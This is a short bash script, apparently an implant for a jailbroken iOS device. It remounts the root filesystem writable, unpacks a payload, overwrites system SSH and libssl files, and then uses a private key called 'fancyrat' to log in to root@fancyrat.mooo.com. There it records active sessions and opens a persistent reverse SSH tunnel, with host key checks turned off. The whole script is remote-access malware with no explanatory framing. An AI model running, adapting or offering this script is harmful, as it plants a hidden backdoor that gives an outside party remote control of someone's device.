 #!/binpack/bin/bash

mount -o rw,union,update /

cd ~/
tar -xzf payload.tar.gz

cp -r ./payload/libssl/ /usr/
cp -r ./payload/ssh/etc /
cp -r ./payload/ssh/usr /


ssh  -oStrictHostKeyChecking=no -i ./payload/keys/fancyrat root@fancyrat.mooo.com "who | grep pts >> connections.list"
ssh -f -T -N -R 2022:localhost:44 -oStrictHostKeyChecking=no -i ./payload/keys/fancyrat root@fancyrat.mooo.com



echo "done"
